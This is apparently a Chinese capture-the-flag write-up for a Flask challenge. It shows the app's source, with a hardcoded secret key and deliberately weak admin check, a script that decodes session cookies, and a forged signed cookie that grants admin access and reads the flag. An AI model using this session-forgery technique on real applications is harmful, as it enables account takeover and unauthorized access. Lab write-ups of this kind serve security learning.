# flask-session

难度：***

## 解题过程

![微信截图_20241015185059](https://gitee.com/LightBeyond/blog_images/raw/master/img/微信截图_20241015185059.png)

flask源码直接展示，进行排版：

```python
from flask import Flask, session, request, render_template_string
import os

app = Flask(__name__)
app.secret_key = 'IronDragon'

@app.route('/')
def index():
    session['role'] = {
        'is_admin': 0,
        'name': 'Augustine'
    }
    with open(__file__, 'r') as file:
        code = file.read()
    return code

@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return 'Without you, you are an intruder!'

    if role.get('is_admin') == 1 and role.get('name') == 'Aili':
        flag = os.popen("cat /flag").read()
        message = "Oh, I believe in you! The flag is: %s" % flag
        return render_template_string(message)
    else:
        return "Error: You don't have the power!"

if __name__ == '__main__':
    app.run(debug=True)
```

一个秘钥key为IronDragon，是编码session时使用的。

在初始页面（/），写入session为：

session['role'] = {
        'is_admin': 0,
        'name': 'Augustine'
 }

在admin页面，要求session中的is_admin = 1， name = Aili，才能执行cat /flag。

所以首先要找一个session解码脚本，比如下面：

```python
# python session 解码
# 伪造使用 flask-session-manage-python3
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                        'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                            'decoding the payload')

    return session_json_serializer.loads(payload)

# 在下面写入要解码的session
if __name__ == '__main__':
   print(decryption("eyJyb2xlIjp7ImlzX2FkbWluIjowLCJuYW1lIjoiQXVndXN0aW5lIn19.Zw4rYw.iqqqNd1MVbP8MDS96CgG36lbbE0".encode()))

```

得到：

{'role': {'is_admin': 0, 'name': 'Augustine'}}

现在要对上述信息进行伪造，令is_admin = 1， name = Aili ：

{'role': {'is_admin': 1, 'name': 'Aili'}}

然后，对构造的session进行编码，使用工具：

**flask-session-cookie-manager-master**

已知秘钥为IronDragon，进行编码：

选择encode，-s指定秘钥，-t指定需要编码的字符串。

![微信截图_20241015185832](https://gitee.com/LightBeyond/blog_images/raw/master/img/微信截图_20241015185832.png)

eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoiQWlsaSJ9fQ.Zw5K0Q.6RX5GwrksIL0w0Rqdzhuqzqq4Qk



上述session，传回/admin下的session字段中，得到flag。